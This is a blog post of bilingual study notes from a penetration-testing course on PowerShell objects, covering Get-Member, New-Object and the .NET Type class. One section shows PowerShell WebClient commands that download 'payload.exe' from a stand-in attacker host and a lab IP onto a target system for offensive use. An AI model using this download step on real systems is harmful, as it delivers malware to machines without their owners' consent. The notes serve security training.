---
layout: post
title: "PowerShell Objects"
date: "2024-06-09"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Professional
    - Resource Development & Initial Access
    - PowerShell for Pentesters
---

# PowerShell Objects
## 2.5 Objects
+ Objects are essentially a representation of data that is provided as a result of running a cmdlet.

+ Rather than with other scripting languages where data is output as text most of the time, PowerShell is different in that the data being output originates from classes within the .NET Framework in the form of “objects.”

+ Objects are partly comprised of collections of properties, along with “methods” that we can use to manipulate the objects.

+ 对象本质上是运行 cmdlet 后提供的数据的表示。

+ 与其他脚本语言不同，其他语言大多数时间将数据作为文本输出，PowerShell 不同的地方在于输出的数据源自 .NET Framework 中的类，以“对象”的形式存在。

+ 对象部分由属性的集合组成，还包括我们可以用来操作对象的“方法”。

+ Let’s take the Get-Process cmdlet as an example.

+ When we run the Get-Process cmdlet along with the “Format-List *” command, as we’ve seen earlier, we get a list of all processes along with their properties.

+ 以 Get-Process cmdlet 为例。

+ 当我们运行 Get-Process cmdlet 并配合使用“Format-List *”命令时，如我们之前所见，我们会得到一个包含所有进程及其属性的列表。

+ If we take a look at the “firefox” process object for example, we can see it contains a number of different properties, (Name, Id, Path) to name a few.

+ 例如，如果我们查看“firefox”进程对象，我们可以看到它包含许多不同的属性，例如名称（Name）、标识（Id）和路径（Path）。

+ Each of the objects also has multiple methods that we can use to manipulate a particular object.

+ To get a list of methods for objects associated with a cmdlet, we can use the “Get-Member” cmdlet as part of a pipeline command, like the following:

+ 每个对象还有多个方法，我们可以使用这些方法来操作特定的对象。

+ 要获取与 cmdlet 关联的对象的方法列表，我们可以使用“Get-Member” cmdlet 作为管道命令的一部分，如下所示：

```
PS C:\> Get-Process | Get-Member –MemberType Method
```

+ The “Get-Member” cmdlet will give us an idea of all of the methods for associated objects, as can be seen below for the “Get-Process” objects.

+ “Get-Member” cmdlet 将让我们了解与之相关对象的所有方法，如下所示，适用于“Get-Process”对象。

```
PS C:\Windows\system32> Get-Process | Get-Member -MemberType Method


   TypeName:System.Diagnostics.Process

Name                      MemberType Definition
----                      ---------- ----------
BeginErrorReadLine        Method     void BeginErrorReadLine()
BeginOutputReadLine       Method     void BeginOutputReadLine()
CancelErrorRead           Method     void CancelErrorRead()
CancelOutputRead          Method     void CancelOutputRead()
Close                     Method     void Close()
CloseMainWindow           Method     bool CloseMainWindow()
CreateObjRef              Method     System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType)
Dispose                   Method     void Dispose(), void IDisposable.Dispose()
Equals                    Method     bool Equals(System.Object obj)
GetHashCode               Method     int GetHashCode()
GetLifetimeService        Method     System.Object GetLifetimeService()
GetType                   Method     type GetType()
InitializeLifetimeService Method     System.Object InitializeLifetimeService()
Kill                      Method     void Kill()
Refresh                   Method     void Refresh()
Start                     Method     bool Start()
ToString                  Method     string ToString()
WaitForExit               Method     bool WaitForExit(int milliseconds), void WaitForExit()
WaitForInputIdle          Method     bool WaitForInputIdle(int milliseconds), bool WaitForInputIdle()
```

+ We can see from the previous output, that several methods that might be of interest to us for the “Get-Process” objects might be, “Kill,” or “Start,” which we could use to Kill, or Start processes.

+ 从前面的输出中我们可以看到，对于“Get-Process”对象，我们可能感兴趣的几个方法包括“Kill”和“Start”，我们可以使用这些方法来结束或启动进程。

**So far:**
1. We’ve identified an object (in this case, a process “firefox”) we’d like to manipulate in some way using the “Get-Process” cmdlet.
2. We’ve determined the methods that are available for use with the objects that were returned by using the “Get-Process | Get-Member” cmdlet and pipeline.
3. And we’ve decided that the “Kill” method is the method we’d like to use for that process (as an example).

**到目前为止：**
1. 我们已经确定了一个对象（在这个例子中是一个名为“firefox”的进程），我们想要使用“Get-Process” cmdlet 对其进行某种操作。
2. 我们已经通过使用“Get-Process | Get-Member” cmdlet 和管道确定了可用于这些返回对象的方法。
3. 我们决定使用“Kill”方法来处理该进程（作为一个例子）。

+ The next step is straightforward. We can simply call the “Get-Process” cmdlet, along with the “-Name” parameter for the “firefox” process, and pipe that to the “Kill” method we identified using the “Get-Member” cmdlet.

+ Our command would like the below, which effectively kills any Firefox processes:

+ 下一步很简单。我们可以简单地调用“Get-Process” cmdlet，配合“firefox”进程的“-Name”参数，并将其传递给我们通过“Get-Member” cmdlet 确定的“Kill”方法。

+ 我们的命令如下，这可以有效地结束任何 Firefox 进程：

```
PS C:\> Get-Process –Name “firefox” | Kill
```

+ This is just one example of how we can manipulate objects using their associated methods to help us meet our objectives.

+ 这只是一个例子，展示了我们如何使用对象的相关方法来帮助我们实现目标。

### 2.5.1 Creating .NET Objects
+ In addition to using the built-in cmdlets to access a large number of objects, which we can then manipulate, we can also create .Net Objects which greatly extends our capabilities using the “New-Object” cmdlet.

+ We can use the “[New-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.4&viewFallbackFrom=powershell-6)” cmdlet to create an instance of a .Net Framework object, or COM object.

+ These can be either created as a “[Type](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-8.0&redirectedfrom=MSDN)” of the .NET Framework class, using fully qualified names of .NET classes, or, we can use the “ProgID” of a COM object.

+ 除了使用内置的 cmdlet 访问大量对象，我们还可以通过“New-Object” cmdlet 创建 .Net 对象，这大大扩展了我们的能力。

+ 我们可以使用“[New-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.4&viewFallbackFrom=powershell-6)” cmdlet 来创建一个 .Net Framework 对象或 COM 对象的实例。

+ 这些对象可以作为 .NET Framework 类的“[Type](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-8.0&redirectedfrom=MSDN)”创建，使用 .NET 类的完全限定名，或者，我们可以使用 COM 对象的“ProgID”。

#### GTP解释
这段话讲述了如何在 PowerShell 中使用 `New-Object` cmdlet 来创建和操作对象，扩展 PowerShell 脚本的功能。下面是详细解释：

1. **使用内置的 cmdlet：** PowerShell 内置了许多 cmdlet，这些 cmdlet 可以让你访问和操作大量的对象。这些对象可能是系统进程、文件、配置设置等。

2. **创建 .Net 对象：** `New-Object` cmdlet 允许你创建 .NET Framework 的对象实例。这意味着你可以直接在 PowerShell 脚本中使用 .NET Framework 的各种类和方法，极大地扩展了 PowerShell 的功能和灵活性。

3. **创建实例的方法：**
   - **.Net Framework 对象：** 你可以指定 .NET 类的完全限定名来创建这些类的实例。例如，如果你想创建一个日期时间对象，可以使用 `New-Object System.DateTime`。
   - **COM 对象：** 通过指定 COM 对象的 `ProgID`（程序标识符），你也可以创建 COM 对象的实例。COM 对象通常用于与老旧的程序或系统交互。

4. **链接资源：** 提供的链接指向 Microsoft 官方文档，进一步解释 `New-Object` cmdlet 的使用方法，以及如何通过 .NET 类型或 COM 对象创建对象的具体细节。

这种能力使得 PowerShell 不仅仅是一个简单的脚本语言，而是一个强大的编程环境，能够利用 .NET 的庞大生态系统，执行复杂和高级的任务。

The passage discusses how to use the `New-Object` cmdlet in PowerShell to create and manipulate objects, thereby expanding the capabilities of PowerShell scripts. Here’s a detailed explanation:

1. **Using Built-in cmdlets:** PowerShell comes with many built-in cmdlets that allow you to access and manipulate a wide range of objects. These objects could be system processes, files, configuration settings, and more.

2. **Creating .Net Objects:** The `New-Object` cmdlet enables you to create instances of .NET Framework objects. This means that you can directly utilize various classes and methods from the .NET Framework within your PowerShell scripts, greatly enhancing PowerShell's functionality and flexibility.

3. **Methods of Creating Instances:**
   - **.Net Framework Objects:** You can create instances of .NET classes by specifying their fully qualified names. For example, if you want to create a DateTime object, you can use `New-Object System.DateTime`.
   - **COM Objects:** You can also create instances of COM objects by specifying the `ProgID` (Program ID) of the COM object. COM objects are typically used for interacting with older programs or systems.

4. **Linked Resources:** The provided links lead to Microsoft's official documentation, which further explains the usage of the `New-Object` cmdlet and specifics on how objects can be created through .NET types or COM objects.

This capability makes PowerShell much more than a simple scripting language; it transforms it into a powerful programming environment that can leverage the vast ecosystem of .NET to perform complex and advanced tasks.

+ As an example of creating a basic object based off of a .NET class with the “New-Object” cmdlet, we can use the “Net.WebClient” .NET system class to download a file to a target system with the following code:

+ 作为使用“New-Object” cmdlet 基于 .NET 类创建基本对象的一个例子，我们可以使用 .NET 系统类“Net.WebClient”来下载文件到目标系统，代码如下：

```
PS C:\> $webclient = New-Object System.Net.WebClient
PS C:\> $payload_url = "https://attacker_host/payload.exe"
PS C:\> $file = “C:\ProgramData\payload.exe"
PS C:\> $webclient.DownloadFile($payload_url,$file)
```

```
PS C:\Windows\system32> $webclient = New-Object System.Net.WebClient
PS C:\Windows\system32> $payload_url = "http://192.168.117.128:8000/payload.exe"
PS C:\Windows\system32> $file = "C:\tmp\payload.exe"
PS C:\Windows\system32> $webclient.DownloadFile($payload_url, $file)
```

In the example on the previous slide (line by line):
1. We create a variable called “$webclient” which instantiates the “System.Net.WebClient” .NET class, which is used to create a web client.
2. We then create another variable ($payload_url), which is the url to our payload.
3. The “$file” variable is then used as the location to which we want to save the payload on the target system.
4. And finally, we call the $webclient” variable with the “DownloadFile” method which downloads our payload.exe to the target.

在前一张幻灯片的示例中（逐行解释）：
1. 我们创建了一个名为“$webclient”的变量，该变量实例化了“.NET System.Net.WebClient”类，用于创建一个网络客户端。
2. 然后，我们创建另一个变量（$payload_url），这是我们有效载荷的 URL。
3. 接着使用“$file”变量作为我们希望在目标系统上保存有效载荷的位置。
4. 最后，我们调用带有“DownloadFile”方法的“$webclient”变量，该方法将我们的 payload.exe 下载到目标。

+ We’ll see more examples of creating .NET and COM objects in the module that follows, but for now, experiment and research on ways you can use the “New-Object” cmdlet to create objects we can leverage for offensive purposes.

+ 在接下来的模块中，我们将看到更多创建 .NET 和 COM 对象的示例，但目前，请尝试和研究你可以如何使用“New-Object” cmdlet 创建我们可以用于攻击目的的对象。

### PowerShell Fundamentals - Conclusion
+ This concludes our lesson on PowerShell fundamentals.

+ Although we really only scratched the surface in regard to PowerShell fundamentals, we encourage you to explore its capabilities and apply those to your offensive work.

+ In the next Module, we’ll be covering specific toolsets and even more useful things we can do with PowerShell for our purposes.

+ 这标志着我们关于 PowerShell 基础的课程的结束。

+ 虽然我们只是浅尝辄止地介绍了 PowerShell 的基础知识，但我们鼓励你探索它的功能并将这些功能应用到你的攻击性工作中。

+ 在下一个模块中，我们将介绍特定的工具集以及更多我们可以利用 PowerShell 完成的有用事项。

### References
+ New-Object: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.4&viewFallbackFrom=powershell-6
+ Type Class: https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-8.0&redirectedfrom=MSDN

#### GTP解释New-Object
PowerShell 的 `New-Object` cmdlet 是一个非常有用的命令，它允许你在 PowerShell 中直接创建和操作 .NET Framework 的对象实例。这个 cmdlet 是 PowerShell 强大功能的体现之一，因为它让脚本编写者能够直接接触到 .NET 库，进而提高脚本的能力和灵活性。

**主要用途**

`New-Object` cmdlet 主要用于创建一个新的对象实例。这些对象可以是来自 .NET 类的任何对象，包括自定义对象或者特定的系统对象，如文件操作、网络通信等。

**使用方法**

要使用 `New-Object` cmdlet 创建对象，你需要指定对象的类型。这可以是任何有效的 .NET 类型，包括系统类型如 `System.DateTime`、`System.Net.WebClient`，或者任何自定义类型。

**示例命令**

```powershell
$newObject = New-Object -TypeName System.Net.WebClient
```

这个例子创建了一个 `System.Net.WebClient` 的新实例，该实例可以用于网络请求，如下载文件等。

**参数**

- **`-TypeName`**: 指定要创建的 .NET 类型的名称。
- **`-ArgumentList`**: 可选参数，传递给对象构造函数的参数列表。
- **`-Property`**: 可以用来直接在创建对象时设置属性的哈希表。

**进阶使用**

除了创建基本的 .NET 对象，`New-Object` 也可以用来创建 COM 对象，这对于需要与 Windows 系统更深层次交互的脚本尤其有用。创建 COM 对象通常涉及到传递 COM 类的 ProgID 或类ID。

**创建 COM 对象的示例**

```powershell
$excel = New-Object -ComObject Excel.Application
```

这个命令创建了一个 Microsoft Excel 的实例，可以用来自动化 Excel 文档的处理。

总的来说，`New-Object` cmdlet 是 PowerShell 脚本中一个非常强大的工具，它提供了直接使用 .NET Framework 的能力，使得 PowerShell 不仅仅是一个命令行工具，而是一个完整的编程环境。

The `New-Object` cmdlet in PowerShell is an extremely useful command that allows you to create and manipulate instances of .NET Framework objects directly within PowerShell. This cmdlet exemplifies one of PowerShell's powerful features, enabling script writers to directly access .NET libraries, thereby enhancing the capabilities and flexibility of their scripts.

**Main Uses**

The primary use of the `New-Object` cmdlet is to create a new object instance. These objects can be from any .NET class, including custom objects or specific system objects, such as those for file operations, network communications, etc.

**Usage**

To create an object using the `New-Object` cmdlet, you need to specify the type of the object. This can be any valid .NET type, including system types like `System.DateTime`, `System.Net.WebClient`, or any custom types.

**Example Command**

```powershell
$newObject = New-Object -TypeName System.Net.WebClient
```

This example creates a new instance of `System.Net.WebClient`, which can be used for network requests, such as downloading files.

**Parameters**

- **`-TypeName`**: Specifies the name of the .NET type to create.
- **`-ArgumentList`**: An optional parameter that provides a list of arguments to the object's constructor.
- **`-Property`**: A hashtable that can be used to directly set properties on the object at the time of creation.

**Advanced Usage**

Besides creating basic .NET objects, `New-Object` can also be used to create COM objects, which is particularly useful for scripts that need deeper interaction with Windows systems. Creating COM objects typically involves passing the ProgID or ClassID of the COM class.

**Example of Creating a COM Object**

```powershell
$excel = New-Object -ComObject Excel.Application
```

This command creates an instance of Microsoft Excel, which can be used for automating the processing of Excel documents.

Overall, the `New-Object` cmdlet is a powerful tool in PowerShell scripting, providing direct access to the .NET Framework, transforming PowerShell from merely a command-line tool into a comprehensive programming environment.

#### GPT解释Type Class
在 PowerShell 中，`Type` 是一个非常重要的概念，主要用于描述和操作.NET 类型系统中的类型。Type 类（System.Type）来自 .NET Framework，PowerShell 利用这个类来获取和操作有关对象类型的信息。

**功能和用途**

`Type` 类主要用于获取一个类型的元数据，包括但不限于：
- 类型的属性（Properties）
- 方法（Methods）
- 事件（Events）
- 类型的构造函数（Constructors）
- 基类和接口信息（Base classes and interfaces）

这些信息对于开发者在编写和调试 PowerShell 脚本时非常有用，特别是在需要详细了解对象结构或进行反射操作时。

**使用场景**

在 PowerShell 中，通常使用 `GetType()` 方法或静态方法 `[type]` 来获取一个对象的 `Type` 对象。例如：

```powershell
$obj = "This is a string"
$type = $obj.GetType()
```

这将返回字符串对象 `$obj` 的类型信息。

另一个示例是直接使用类型字面量来获取类型信息：

```powershell
$type = [System.String]
```

这样可以直接引用 String 类型，无需创建实例。

**Type 类的常见方法和属性**

- **`FullName`**: 获取类型的完整名称。
- **`BaseType`**: 获取类型的基类型。
- **`Assembly`**: 获取定义类型的程序集。
- **`IsPublic`**, **`IsPrivate`**: 指示类型的访问级别。
- **`IsClass`**, **`IsInterface`**, **`IsValueType`**: 指示类型是类、接口还是值类型。

**实际应用**

`Type` 类在自动化脚本中尤其有用，它可以用来动态地创建对象，调用方法，或者访问属性。通过反射（Reflection），开发者可以在运行时检查类型的成员，这使得 PowerShell 脚本能够非常灵活和强大。

例如，可以使用 `Type` 类的信息来动态调用方法：

```powershell
$method = $type.GetMethod("Substring")
$result = $method.Invoke($obj, @(1, 5))
```

这将调用字符串对象 `$obj` 的 `Substring` 方法。

总的来说，`Type` 类为 PowerShell 提供了一个强大的工具，使其能够与 .NET 类型系统紧密集成，从而发挥出更大的威力和灵活性。

In PowerShell, the concept of `Type` is crucial for describing and manipulating types within the .NET type system. The Type class (`System.Type`) from the .NET Framework is utilized by PowerShell to access and manipulate information about object types.

**Functionality and Uses**

The `Type` class is primarily used to obtain metadata about a type, including but not limited to:
- Properties of the type
- Methods
- Events
- Constructors of the type
- Information about base classes and interfaces

This information is invaluable for developers when writing and debugging PowerShell scripts, especially when detailed understanding of an object's structure or reflection operations are needed.

**Usage Scenarios**

In PowerShell, the `GetType()` method or the static `[type]` method is commonly used to obtain a `Type` object for an existing object. For example:

```powershell
$obj = "This is a string"
$type = $obj.GetType()
```

This will return the type information for the string object `$obj`.

Another example involves directly using a type literal to obtain type information:

```powershell
$type = [System.String]
```

This allows direct reference to the String type without needing to create an instance.

**Common Methods and Properties of the Type Class**

- **`FullName`**: Retrieves the full name of the type.
- **`BaseType`**: Retrieves the base type of the type.
- **`Assembly`**: Retrieves the assembly that defines the type.
- **`IsPublic`**, **`IsPrivate`**: Indicates the access level of the type.
- **`IsClass`**, **`IsInterface`**, **`IsValueType`**: Indicates whether the type is a class, interface, or value type.

**Practical Applications**

The `Type` class is particularly useful in automation scripts, allowing for dynamic creation of objects, invocation of methods, or access to properties. Through reflection, developers can inspect the members of a type at runtime, making PowerShell scripts extremely flexible and powerful.

For example, you can use information from the `Type` class to dynamically invoke methods:

```powershell
$method = $type.GetMethod("Substring")
$result = $method.Invoke($obj, @(1, 5))
```

This will invoke the `Substring` method on the string object `$obj`.

Overall, the `Type` class provides a powerful tool for PowerShell, enabling it to integrate closely with the .NET type system, thus leveraging greater power and flexibility.
